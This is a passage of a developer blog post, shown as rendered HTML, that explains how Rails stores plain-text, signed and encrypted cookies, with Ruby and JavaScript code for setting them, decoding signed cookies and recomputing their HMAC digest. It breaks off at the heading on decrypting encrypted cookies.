&lt;li&gt;&lt;p&gt;&lt;strong&gt;Plain text&lt;/strong&gt; : These cookies can be viewed and changed by a user.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Signed&lt;/strong&gt; : Signed cookies look like gibberish but they can easily be decoded by a user although they can't be modified as they are cryptographically signed. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Encrypted&lt;/strong&gt; : Encrypted cookies can't be decoded by a user (not easily, anyway) and nor can they be modified as they are authenticated at the time of decryption.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1&gt;
  &lt;a href="#plain-text-cookies" class="anchor"&gt;
  &lt;/a&gt;
  Plain Text Cookies
&lt;/h1&gt;

&lt;p&gt;Plain text cookies should be used very cautiously and sparingly. They can be viewed and changed to any value by a user without our application ever knowing. A good use case for a plain text cookie would be to store whether or not a welcome message has been shown to the user.  &lt;/p&gt;

&lt;p&gt;You can set such a cookie with a single line of code in a controller action:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:welcome_message_shown&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"true"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;This line will add a &lt;code&gt;Set-Cookie&lt;/code&gt; &lt;a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields"&gt;HTTP header&lt;/a&gt; to the response; with the value &lt;code&gt;welcome_message_shown=true&lt;/code&gt;. When the browser receives the response, it will store the cookie and send it as a header with every subsequent request. You can view the cookie under the &lt;strong&gt;Storage&lt;/strong&gt; tab of your browser's developer tools.  &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6uwcAftM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.chapter24.blog/1604084171jg987FrR8n8EltFNFCdumQ" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6uwcAftM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.chapter24.blog/1604084171jg987FrR8n8EltFNFCdumQ"&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;
      Inspecting the value of a cookie using a browser's developer tools&lt;br&gt;
    
    &lt;/p&gt;

&lt;p&gt;The value of the cookie can be changed by double-clicking and modifying the &lt;em&gt;value&lt;/em&gt; field. In this case it doesn't matter as the worst case is the user should be shown a welcome message again. For any sensitive information, &lt;em&gt;signed&lt;/em&gt; or &lt;em&gt;encrypted&lt;/em&gt; cookies should be used.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#signed-cookies" class="anchor"&gt;
  &lt;/a&gt;
  Signed Cookies
&lt;/h1&gt;

&lt;p&gt;Signed cookies are designed to store information that is harmless for a user to view but not modify. Values such as a &lt;strong&gt;user id&lt;/strong&gt; or the user's &lt;strong&gt;preferences&lt;/strong&gt; are ideal candidates for signed cookies.   &lt;/p&gt;

&lt;p&gt;The value of a signed cookie is serialized along with some metadata before being encoded and signed. The default serializer is &lt;code&gt;JSON&lt;/code&gt; but this can be changed in the &lt;code&gt;cookies_serializer.rb&lt;/code&gt; file under the &lt;code&gt;config/initializers&lt;/code&gt; directory.   &lt;/p&gt;

&lt;p&gt;Under the hood, Rails uses the &lt;a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html"&gt;&lt;code&gt;ActiveSupport::MessageVerifier&lt;/code&gt;&lt;/a&gt; API to encode and sign the cookie data.  &lt;/p&gt;

&lt;p&gt;These cookies can also be read in JavaScript (as demonstrated later) so they're a great way to send &lt;a href="https://signalvnoise.com/posts/3112-how-basecamp-next-got-to-be-so-damn-fast-without-using-much-client-side-ui"&gt;user specific data from your database to your JavaScript application&lt;/a&gt;.  &lt;/p&gt;

&lt;p&gt;Storing a signed cookie is as easy as storing a plain text cookie:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;signed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:user_id&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"42"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;This results in a cookie that looks like gibberish to the naked eye.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqUXlJZz09IiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUudXNlcl9pZCJ9fQ%3D%3D--94afbf4575daf37313f40d6342a994a5e1719d79"
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;There's two parts to this string and they're separated by the &lt;code&gt;--&lt;/code&gt;. The first part is a &lt;a href="https://en.wikipedia.org/wiki/Base64"&gt;Base64 encoded&lt;/a&gt; JSON object containing the value we stored and the second part is a cryptographically generated digest. When Rails receives a signed cookie, it compares the value to the digest and if they don't match, the cookie's value will be &lt;code&gt;nil&lt;/code&gt;'d. That's why a user cannot modify a signed cookie.  &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Decoding signed cookies&lt;/strong&gt;  &lt;/p&gt;

&lt;p&gt;A signed cookie can be decoded with the following Ruby code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqUXlJZz09IiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUudXNlcl9pZCJ9fQ%3D%3D--94afbf4575daf37313f40d6342a994a5e1719d79"&lt;/span&gt;
&lt;span class="n"&gt;cookie_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"--"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;first&lt;/span&gt;
&lt;span class="n"&gt;cookie_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;URI&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookie_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;cookie_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;parse&lt;/span&gt; &lt;span class="no"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;decode64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookie_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;The above code extracts the &lt;em&gt;Base64 encoded JSON object&lt;/em&gt; by splitting the cookie value on the &lt;code&gt;--&lt;/code&gt;. It then unescapes the value, decodes it and parses it into a &lt;code&gt;Hash&lt;/code&gt; that looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt; 
  &lt;span class="s2"&gt;"_rails"&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;"message"&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;"IjQyIg=="&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
    &lt;span class="s2"&gt;"exp"&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
    &lt;span class="s2"&gt;"pur"&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;"cookie.user_id"&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;```




The only attribute that's relevant here is `&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="sb"&gt;`. `&lt;/span&gt;&lt;span class="n"&gt;exp&lt;/span&gt;&lt;span class="sb"&gt;` (expiry) and `&lt;/span&gt;&lt;span class="n"&gt;pur&lt;/span&gt;&lt;span class="sb"&gt;` (purpose) are values used by [`&lt;/span&gt;&lt;span class="no"&gt;ActiveSupport&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;MessageVerifier&lt;/span&gt;&lt;span class="sb"&gt;`](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html) during decoding and validation.  

The `&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="sb"&gt;` is also a _Base64 encoded JSON object_ so we decode it the same way as above:




```&lt;/span&gt;&lt;span class="n"&gt;ruby&lt;/span&gt;
&lt;span class="n"&gt;decoded_stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;decode64&lt;/span&gt; &lt;span class="n"&gt;cookie_payload&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"_rails"&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;"message"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;parse&lt;/span&gt; &lt;span class="n"&gt;decoded_stored_value&lt;/span&gt;
&lt;span class="c1"&gt;# =&amp;gt; "42"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Since the &lt;code&gt;message&lt;/code&gt; is stored as a &lt;em&gt;Base64 encoded JSON object&lt;/em&gt;, we can store any JSON serializable object in a signed cookie; it doesn't have to be a string. However to store other kinds of objects, it needs to be placed in a &lt;code&gt;Hash&lt;/code&gt; with the key &lt;code&gt;value&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;signed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:preferences&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
    &lt;span class="ss"&gt;value: &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="ss"&gt;use_dark_mode: &lt;/span&gt;&lt;span class="kp"&gt;true&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Decoding signed cookies using JavaScript&lt;/strong&gt;  &lt;/p&gt;

&lt;p&gt;The above Ruby code to decode a signed cookie can be translated into JavaScript very easily. So if you need use information stored in signed cookies on the client, you can!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqUXlJZz09IiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUudXNlcl9pZCJ9fQ%3D%3D--94afbf4575daf37313f40d6342a994a5e1719d79&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;cookie_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;--&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;cookie_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;atob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cookie_value&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;decoded_stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;atob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cookie_payload&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;_rails&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;stored_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;decoded_stored_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;stored_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;// =&amp;gt; "42"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How the digest is computed&lt;/strong&gt;  &lt;/p&gt;

&lt;p&gt;The second half of a signed cookie is the digest which is used to verify its validity. It's &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/activesupport/lib/active_support/message_verifier.rb#L200"&gt;calculated using OpenSSL&lt;/a&gt; with the &lt;a href="https://en.wikipedia.org/wiki/SHA-1"&gt;&lt;code&gt;SHA1&lt;/code&gt;&lt;/a&gt; hash function as the default. The hash function can be changed by setting &lt;code&gt;config.action_dispatch.signed_cookie_digest&lt;/code&gt; in your &lt;code&gt;application.rb&lt;/code&gt;.  &lt;/p&gt;

&lt;p&gt;The hash function requires a &lt;code&gt;secret&lt;/code&gt; in addition to the data to be hashed. The &lt;code&gt;secret&lt;/code&gt; is also &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/activesupport/lib/active_support/key_generator.rb#L22"&gt;calculated using OpenSSL&lt;/a&gt; and is &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/railties/lib/rails/application.rb#L173"&gt;based on the &lt;code&gt;secret_key_base&lt;/code&gt;&lt;/a&gt; that you find in your &lt;code&gt;credentials.yml&lt;/code&gt; file and &lt;a href="https://github.com/rails/rails/blob/fe76a95b0d252a2d7c25e69498b720c96b243ea2/actionpack/lib/action_dispatch/middleware/cookies.rb#L571"&gt;another string&lt;/a&gt; called a &lt;a href="https://en.wikipedia.org/wiki/Salt_(cryptography)"&gt;&lt;em&gt;salt&lt;/em&gt;&lt;/a&gt;. By default the salt is "signed cookie", but it can be changed by setting &lt;code&gt;config.action_dispatch.signed_cookie_salt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Following the same methods as used in the Rails source code, we can calculate the digest with the following code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqUXlJZz09IiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUudXNlcl9pZCJ9fQ%3D%3D--94afbf4575daf37313f40d6342a994a5e1719d79"&lt;/span&gt;
&lt;span class="n"&gt;cookie_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;URI&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"--"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;first&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Rails&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;application&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;secret_key_base&lt;/span&gt;
&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;PKCS5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;pbkdf2_hmac_sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;secret&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"signed cookie"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;digest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;HMAC&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Digest&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;const_get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"SHA1"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;new&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookie_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# =&amp;gt; "94afbf4575daf37313f40d6342a994a5e1719d79"&lt;/span&gt;

&lt;span class="n"&gt;digest&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"--"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nf"&gt;second&lt;/span&gt;
&lt;span class="c1"&gt;# =&amp;gt; true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;As you can see, the digest calculated using OpenSSL matches the digest part of the cookie. So if an attacker tried to modify the data in the cookie, the digest would no longer match and Rails would &lt;code&gt;nil&lt;/code&gt; the content of the cookie. The only way an attacker could calculate a valid digest is if they knew the &lt;code&gt;secret_key_base&lt;/code&gt; and &lt;em&gt;salt&lt;/em&gt;; which is why it's critical to keep these values safe.  &lt;/p&gt;

&lt;p&gt;In practice, Rails uses &lt;a href="https://api.rubyonrails.org/classes/ActiveSupport/KeyGenerator.html"&gt;&lt;code&gt;ActiveSupport::KeyGenerator&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html"&gt;&lt;code&gt;ActiveSupport::MessageVerifier&lt;/code&gt;&lt;/a&gt; to abstract away the OpenSSL functions. However I used OpenSSL directly in the demo above for clarity. Those encryption functions can be used in any programming language to encode and decode Rails cookies; so if you have services in your infrastructure that aren't written using Rails, you can still use the data in Rails cookies quite easily.  &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#encrypted-cookies" class="anchor"&gt;
  &lt;/a&gt;
  Encrypted Cookies
&lt;/h1&gt;

&lt;p&gt;Any sensitive data stored in cookies should ALWAYS be encrypted. A &lt;code&gt;remember_token&lt;/code&gt; is often used by applications to keep a user logged in even if they close the browser. This information is as sensitive as a user's password so it's a great example of the kind of thing that should be stored in an encrypted cookie.  &lt;/p&gt;

&lt;p&gt;Encrypted cookies are serialized in the same way as signed cookies and they're encrypted using &lt;a href="https://api.rubyonrails.org/v6.0.3.2/classes/ActiveSupport/MessageEncryptor.html"&gt;&lt;code&gt;ActiveSupport::MessageEncryptor&lt;/code&gt;&lt;/a&gt; (which uses OpenSSL under the hood).   &lt;/p&gt;

&lt;p&gt;Let's create an encrypted cookie and see what it looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;show&lt;/span&gt;
  &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:remember_token&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"token"&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;This sets a cookie that looks like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"aDkxgmW4kaxoXBGnjxAaBY7D47WUOveFdeai5kk2hHlYVqDo7xtzZJup5euTdH5ja5iOt37MMS4SVXQT5RteaZjvpdlA%2FLQi7IYSPZLz--2A6LCUu%2F5AsLfSez--QD%2FwiA2t8QQrKk6rrROlPQ%3D%3D"
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;As seen above, an encrypted cookie is divided into 3 parts separated by &lt;code&gt;--&lt;/code&gt;, rather than two parts like a signed cookie. The first part is the encrypted data. The second part is called an &lt;a href="https://en.wikipedia.org/wiki/Initialization_vector"&gt;initialization vector&lt;/a&gt;, which is a random input to the encryption algorithm. And the third part is an &lt;a href="https://crypto.stackexchange.com/questions/67107/what-is-the-purpose-of-an-authentication-tag-in-aead-encryption-schemes"&gt;authentication tag&lt;/a&gt;, which is similar to the &lt;em&gt;digest&lt;/em&gt; of a signed cookie. All three parts are &lt;strong&gt;Base64 encoded&lt;/strong&gt;.  &lt;/p&gt;

&lt;p&gt;By default, cookies are encrypted with &lt;a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;AES&lt;/a&gt; using a 256-bit key in &lt;a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode"&gt;Galois/Counter Mode&lt;/a&gt; (&lt;code&gt;aes-256-gcm&lt;/code&gt;). This can be changed by setting &lt;code&gt;config.action_dispatch.encrypted_cookie_cipher&lt;/code&gt; to any valid &lt;a href="https://ruby-doc.org/stdlib-2.7.1/libdoc/openssl/rdoc/OpenSSL/Cipher.html"&gt;&lt;code&gt;OpenSSL::Cipher&lt;/code&gt;&lt;/a&gt; algorithm.  &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Decrypting encrypted cookies&lt;/strong&gt;  &lt;/p&gt;

